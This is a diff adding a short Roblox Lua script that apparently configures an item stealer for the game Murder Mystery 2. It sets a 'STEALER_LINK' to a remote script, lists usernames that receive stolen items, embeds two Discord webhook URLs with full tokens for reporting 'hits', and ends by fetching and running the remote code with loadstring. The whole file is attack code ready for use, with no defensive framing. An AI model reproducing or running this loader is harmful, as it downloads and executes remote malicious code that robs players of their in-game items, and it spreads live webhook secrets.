@@ -1,0 +1,14 @@
+STEALER_LINK = 'https://raw.githubusercontent.com/alonyen/xhub/refs/heads/main/mm2'
+
+DISCORD_ID = '1262833631546839148'
+
+Usernames = {
+    'alonyen117', -- PUT UR ROBLOX USERNAMES
+    'frizz_script', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'frizz_script2',
+}
+
+BigHitsWebhook = "https://discordapp.com/api/webhooks/1399663743230803998/-ZAfb-OkVmrblvc3FTRckkFLrmp3wFNLjMYkdI0OwAWGza6D0nkk4CeJOL7OzH6zk7wm"
+SmallHitsWebhook = "https://discordapp.com/api/webhooks/1399665735332008028/lBB5ps4Hzklqi3lea2Y9RwM2fQLYvkwymk6cYpPq7HivGc3yCnVQ9LQzT1TQ1JONnSPj"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() 
